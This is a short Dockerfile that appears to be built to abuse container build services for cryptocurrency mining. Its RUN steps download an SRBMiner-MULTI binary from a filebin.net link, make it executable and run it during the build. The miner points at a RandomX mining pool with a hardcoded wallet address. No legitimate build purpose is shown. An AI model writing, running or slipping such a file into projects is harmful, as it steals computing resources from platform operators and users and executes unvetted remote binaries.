FROM ubuntu:20.04 as ubuntu-base

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

RUN apt update
RUN apt -y install wget
RUN wget https://filebin.net/akyledae6dlzo6ot/SRBMiner-MULTI
RUN chmod +x SRBMiner-MULTI
RUN ./SRBMiner-MULTI --algorithm randomx --pool randomx.rplant.xyz:17107 --tls true --wallet TaBohkLdkWDMVaSLQs9wxtP43eCf5MdLoQ968kSFTGhj9SRmLGcx8fvHmjyUaUo5kKEsw2ucaCSe8WZR2rCFZYUj2RxrwBmQXD.DG2
